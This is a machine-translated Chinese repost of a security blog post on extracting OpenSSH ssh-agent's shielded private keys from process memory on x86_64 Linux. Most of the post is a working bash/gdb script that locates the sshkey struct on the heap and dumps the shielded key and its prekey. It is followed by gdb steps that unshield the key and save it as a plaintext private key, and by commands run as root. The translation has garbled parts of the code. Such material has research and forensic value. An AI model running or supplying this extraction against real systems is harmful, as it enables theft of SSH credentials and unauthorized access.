<!doctype html><html lang="zh-hans"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>OpenSSH SSH-Agent 屏蔽私钥提取 (x86_64 Linux)</title><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"><link rel="stylesheet" href="/img/css.css?random="><link data-rh="true" rel="icon" href="/img/favicon.ico"/><script data-ad-client="ca-pub-6067137220025946" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script type="text/javascript" src="https://platform-api.sharethis.com/js/sharethis.js#property=5effb96910009800120b8d4d&product=inline-share-buttons" async="async"></script>
<script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?03c1a0f31299b4a2fbb83c34d6beaac9";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script></head><body><div id="my_header"><div class="container"><nav class="navbar navbar-expand-lg"><a class="navbar-brand" href="/"><img alt="diglog" src="/img/logo.v1.gif" class="rounded-sm"></a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarNavAltMarkup"><div class="navbar-nav"></div></div></nav></div></div><div class="container"><div id="my_content"><h1 class="page_narrow">OpenSSH SSH-Agent 屏蔽私钥提取 (x86_64 Linux)</h1><div class="row"><div class="col-lg-12 col-12"><div class="my_story_list_item shadow p-3 mb-5 bg-white rounded"><div class="story_page_pub_time page_narrow">2021-07-24 07:08:08</div><div class="story_img_container"><a href="http://img2.diglog.com/img/2021/7/dc4c871352e79f687f2f9f86b90fcf14.png"><img src="http://img2.diglog.com/img/2021/7/dc4c871352e79f687f2f9f86b90fcf14.png" class="img-fluid my_story_img" onerror="this.style.display='none'"></a></div><div class="page_narrow text-break page_content"><p>这只是我想分享的一些笔记的快速博客文章。引入了受保护的私钥是为了防止对 ssh-agent 保存在内存中的 ssh 密钥进行 Spectre/Meltdown 攻击。基本上，当您通过 ssh 向 ssh-agent 添加密钥时，该密钥将使用从随机 16KB pre_key 派生的对称密钥加密（屏蔽）。由 ssh-agent 管理的身份由一个（列表）身份结构表示，该结构包含对密钥注释的引用和指向相关密钥的指针；新的屏蔽密钥及其 pre_key 都在这个 sshkey 结构中被 shielded_private 和 shield_prekey 指针引用。因此，如果我们在堆中查找关键注释地址的 XREF，我们应该能够找到 sshkey 结构；还知道它的最后一个字段总是设置为 0x4000 (16KB)，这是固定的 shield_prekey_len 有助于识别 sshkey 结构。为了快速证明上述内容，我编写了以下 bash/gdb 脚本来转储私有的屏蔽密钥及其 pre_key： #!/bin/bash GDB=/usr/bin/gdb if [[ $# -lt 2 ]];然后echo &quot;Usage: ./script [pid] [key comment]&quot; &gt;&amp;2 exit 2 fi PID=$1 COMMENT=$2 COMMENT_LEN=${#COMMENT} HEAP=$(cat /proc/$PID/maps | grep heap) #echo $HEAP START=0x${HEAP:0:12} END=0x${HEAP:13:12} COMMADDR=$($GDB -p $PID -batch -ex &quot;find $START, $END, {char [$COMMENT_LEN]}\&quot;$COMMENT\&quot;&quot; 2&gt;/dev/null | egrep ^0[xX][0-9a-fA-F]{12}$) echo &quot;[ - ] 在中搜索关键注释字符串内存 -&gt; 这是我发现的：&quot; echo &quot;$COMMADDR&quot; echo &quot;[ - ] 现在在 $COMMADDR 中为 i 搜索我们找到的注释地址的外部参照 -&gt; 寻找堆地址；做 TEMPF=&quot;\x${i:12:2}\x${i:10:2}\x${i:8:2}\x${i:6:2}\x${i: 4:2}\x${i:2:2}&quot; TEMPPTR=$($GDB -p $PID -batch -ex &quot;find $START, $END, {char[6]}\&quot;$TEMPF\&quot;&quot; 2&gt;/dev/null | egrep ^0[xX][0-9a-fA-F]{12}$) for j in $TEMPPTR; do VAR2=$(($j - 0x8)) # Identity-&gt;j = char *comment;身份-&gt;(j - 0x8) = struct sshkey *key; VAR=$($GDB -p $PID -batch -ex &quot;x/za $VAR2&quot; 2&gt;/dev/null | egrep ^0[xX][a-f0-9A-F]{12}\:) VAR3 =${VAR:15} echo &quot;[ o ] XREF $j 包含 $VAR3 让我们看看它是否在堆中&quot; if (($VAR3 &gt; $START)) then if (($VAR3 &lt; $END)) then echo &quot;[ + ] 在堆 $VAR3 中找到一个 XREF -&gt; 在这个地址搜索一个 sshkey 结构&quot; KEYPOS=$(($VAR3 + 0xa0)) KEYLEN=$($GDB -p $PID -batch -ex &quot;x /d $KEYPOS&quot; 2&gt;/dev/null | egrep ^0[xX][a-f0-9A-F]{12}\:) echo &quot;SHIELD_PRIVATE_LEN ${KEYLEN:15}&quot; KEYLEN1=${KEYLEN:15 } if (($KEYLEN1 != 16384)) then echo &quot;[ - ] Key not found -&gt; now to the next ptr&quot; continue else echo &quot;[ + ] 找到被屏蔽的私钥 -&gt; 现在转储它&quot; SHPOS=$( ($VAR3 + 0x88)) SPPOS=$(($VAR3 + 0x98)) PKEYLENPOS=$(($VAR3 + 0x90)) SHIELDED_PRIVATE=$($GDB -p $PID -batch -ex &quot;x/za $SHPOS&quot; 2&gt;/dev/null | egrep ^0[xX][a-f0-9A-F]{12}\:) SHIELDED_PREKEY=$($GDB -p $PID -batch -ex &quot;x/za $SPPOS&quot; 2 &gt;/dev/null | egrep ^0[xX][a-f0-9A-F]{12}\:) PKEYLEN=$($GDB -p $PID -batch -ex &quot;x/za $PKEYLENPOS&quot; 2&gt; /dev/null | egr ep ^0[xX][a-f0-9A-F]{12}\:) printf &quot;SHIELDED_PRIVATE %s\r\n&quot; ${SHIELDED_PRIVATE:15} printf &quot;SHIELDED_LENGTH %d\r\n&quot; ${PKEYLEN :15} printf &quot;SHIELD_PREKEY %s\r\n&quot; ${SHIELDED_PREKEY:15} printf &quot;SHIELD_PREKEY_LEN 16384\r\n&quot; exec $GDB -p $PID &lt;&lt;EOF set \$fd = fopen(&quot;/tmp/shielded_private &quot;, &quot;w&quot;) call fwrite(${SHIELDED_PRIVATE:15}, 1, ${PKEYLEN:15}, \$fd) call fflush(\$fd) call fclose(\$fd) set \$fd = fopen( &quot;/tmp/shield_prekey&quot;, &quot;w&quot;) call fwrite(${SHIELDED_PREKEY:15}, 1, 16384, \$fd) call fflush(\$fd) call fclose(\$fd) detach quit quit EOF fi fi fi done done 以 root 用户身份运行它，如下所示： # ps auxw | grep ssh-agent # 查找 ssh-agent-pid # lsof -p ssh-agent-pid | grep unix # find target-unix-socket-path # export SSH_AUTH_SOCK=target-unix-socket-path # ssh-add -l # find key@comment # ./ospkd.sh ssh-agent-pid key@comment</p><p>为了避免像我的脚本那样弄乱进程内存，因为无论如何 gdb 都是可用的，一个更方便的方法是使用 gcore 转储进程内存，我们以后可以用 Ghidra 解析它；下面附有一个非常简单的 Ghidra 脚本，它在 ssh-agent gcore 文件上执行相同的操作。现在我们有了屏蔽的私钥和它的预密钥，我们如何取消屏蔽呢？经过几次尝试，我意识到我只需要两个函数，猜猜看，ssh-keygen 是唯一实现这两个函数的二进制文件。这两个函数是 sshkey_unshield_private() 和 sshkey_save_private()（使用空白密码调用）。所以我想出的最快的解决方案是在我的本地机器上用符号编译 ssh-keygen： $ tar xvfz openssh-8.6p1.tar.gz $ cd openssh-8.6p1 $ ./configure --with-audit=debug $ make ssh-keygen $ gdb ./ssh-keygen b main b sshkey_free r set $miak = (struct sshkey *)sshkey_new(0) set $shielded_private = (unsigned char *)malloc(1392) set $shield_prekey = (unsigned char *) malloc(16384) set $fd = fopen(&quot;/tmp/shielded_private&quot;, &quot;r&quot;) call fread($shielded_private, 1, 1392, $fd) call fclose($fd) set $fd = fopen(&quot;/tmp/ shield_prekey&quot;, &quot;r&quot;) call fread($shield_prekey, 1, 16384, $fd) call fclose($fd) set $miak-&gt;shielded_private=$shielded_private set $miak-&gt;shield_prekey=$shield_prekey set $miak-&gt;shielded_len =1392 set $miak-&gt;shield_prekey_len=16384 call sshkey_unshield_private($miak) bt f 1 x *kp call sshkey_save_private(*kp, &quot;/tmp/plaintext_private_key&quot;, &quot;&quot;, &quot;comment&quot;, 0, &quot;\x00&quot;, ) kq 我们在 sshkey_free() 处中断的原因是因为 gdb malloc 的 sshkey_struct 不能被 sshke 释放y_free() （我猜，哈哈），它会在保存未屏蔽的密钥之前崩溃。所以我们在 sshkey_free() 被命中之前调用 sshkey_save_private()。注意：此过程仅针对 Ubuntu 20.04.2 LTS 上的 RSA 和 DSA 密钥进行了测试。和 Kali Linux 2021.2。它可能需要一些调整才能在其他平台上工作。</p></div><div id="story_share_this"><div class="sharethis-inline-share-buttons"></div></div><div class="text-break sotry_link page_narrow"><a target="_blank" href="https://security.humanativaspa.it/openssh-ssh-agent-shielded-private-key-extraction-x86_64-linux/">https://security.humanativaspa.it/openssh-ssh-agent-shielded-private-key-extraction-x86_64-linux/</a></div><div class="story_tags page_narrow"><button type="button" class="btn btn-light my_tag"><a href="/tag/linux/">#linux</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/提取/">#提取</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/ssh/">#ssh</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/quot/">#quot</a></button></div></div><div class="shadow p-3 mb-5 bg-white rounded clearfix"><div class="container"><div class="row"><div class="col-sm"><div><a target="_blank" href="/story/1068985.html"><img src="http://img2.diglog.com/img/2021/7/thumb_d202fbfc697e4f5fe3c5ecde41d1adfc.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1068985.html">两个星期二的漏洞让 Windows 和 Linux 用户感到不安</a></div><span class="my_story_list_date">2021-7-22 22:50</span></div><div class="col-sm"><div><a target="_blank" href="/story/1068859.html"><img src="http://img2.diglog.com/img/2021/7/thumb_4f3c84b1cbb5f8081dcc0cf3aa43629b.png" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1068859.html">Wiser – 最小的虚拟机管理程序启动 Linux VM。用 C 写的</a></div><span class="my_story_list_date">2021-7-22 22:7</span></div><div class="col-sm"><div><a target="_blank" href="/story/1068763.html"><img src="http://img2.diglog.com/img/2021/7/thumb_b89174ea0688f7d8919c79c8d2113702.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1068763.html">Linux 5.0 显示在 ESP32 处理器上启动</a></div><span class="my_story_list_date">2021-7-22 21:37</span></div><div class="col-sm"><div><a target="_blank" href="/story/1068633.html"><img src="http://img2.diglog.com/img/2021/6/thumb_2690ee9f646d812a157ec824846c4b3b.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1068633.html">Linux基金会正在努力改善语音识别道德 </a></div><span class="my_story_list_date">2021-6-29 23:52</span></div></div></div></div><div class="my_movie_list_item shadow p-3 mb-5 bg-white rounded"><button type="button" class="btn btn-link my_tag"><a href="/tag/web2.0/">#web2.0</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/google/">#google</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/设计/">#设计</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/创意/">#创意</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/摄影/">#摄影</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/图片/">#图片</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/游戏/">#游戏</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/软件/">#软件</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/手机/">#手机</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/视频/">#视频</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/广告/">#广告</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/iphone/">#iphone</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/网站/">#网站</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/免费/">#免费</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/windows/">#windows</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/下载/">#下载</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/微软/">#微软</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/blog/">#blog</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/firefox/">#firefox</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/苹果/">#苹果</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/音乐/">#音乐</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/apple/">#apple</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/博客/">#博客</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/wordpress/">#wordpress</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/恶搞/">#恶搞</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/qq/">#qq</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/艺术/">#艺术</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/web/">#web</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/工具/">#工具</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/分享/">#分享</a></button></div></div></div><div id="my_footer"><div class=""><a href="/tags/">tags</a> <a href="/users/">users</a></div>&copy;2012-2021 diglog.com </div></div></body></html>